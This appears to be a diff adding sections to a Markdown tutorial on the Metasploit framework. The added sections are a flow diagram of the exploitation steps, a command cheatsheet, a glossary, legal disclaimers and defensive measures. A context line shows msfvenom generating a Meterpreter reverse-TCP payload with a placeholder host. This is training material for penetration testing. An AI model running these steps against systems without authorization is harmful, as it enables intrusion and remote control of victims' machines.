@@ -2888,6 +2888,95 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=x \
 
 ---
 
+## 📊 MERMAID DIAGRAMS - Metasploit Flow
+
+```mermaid
+graph TD
+    A[msfconsole] --> B[Search Exploit]
+    B --> C[Use Module]
+    C --> D[Set Options]
+    D --> E[Set Payload]
+    E --> F[Set LHOST/LPORT]
+    F --> G[Run Exploit]
+    G --> H{Success?}
+    H -->|Yes| I[Meterpreter Session]
+    H -->|No| J[Try Different Exploit]
+    J --> B
+```
+
+---
+
+## ⚡ TOOL CHEATSHEET
+
+| Command | Purpose |
+|---------|---------|
+| `msfconsole` | Start framework |
+| `search <term>` | Find exploits |
+| `use <module>` | Select module |
+| `set RHOSTS <ip>` | Set target |
+| `set PAYLOAD <p>` | Set payload |
+| `exploit` | Launch attack |
+| `sessions -l` | List sessions |
+| `msfvenom -p <payload>` | Generate payload |
+
+---
+
+## 🔧 TOOL COMPARISON
+
+| Framework | Type |
+|-----------|------|
+| Metasploit | Exploitation |
+| Cobalt Strike | Red team |
+| Empire | Post-exploitation |
+
+---
+
+## 🚀 CHALLENGES
+
+1. Exploit vulnerable service
+2. Get Meterpreter session
+3. Post-exploitation tasks
+
+⚠️ **LEGAL:** Test only authorized systems!
+
+---
+
+## 📖 GLOSSARY
+
+| Term | Definition |
+|------|------------|
+| Exploit | Vulnerability code |
+| Payload | Malicious code |
+| Meterpreter | Advanced payload |
+| Shell | Command access |
+| LHOST | Your IP |
+| RHOST | Target IP |
+
+---
+
+## 💼 CAREER: Penetration Tester
+
+**Salary:** $80K-$180K
+**Certs:** OSCP, OSCE, CRTO
+
+---
+
+## ⚠️ LEGAL DISCLAIMER
+
+**Metasploit for authorized testing ONLY!**
+Unauthorized exploitation is a federal crime.
+
+---
+
+## 🛡️ DEFENSIVE MEASURES
+
+- Patch management
+- Network segmentation
+- EDR deployment
+- Regular vulnerability scanning
+
+---
+
 ## ⚠️ SECURITY BEST PRACTICES
 
 ### ✅ DO's
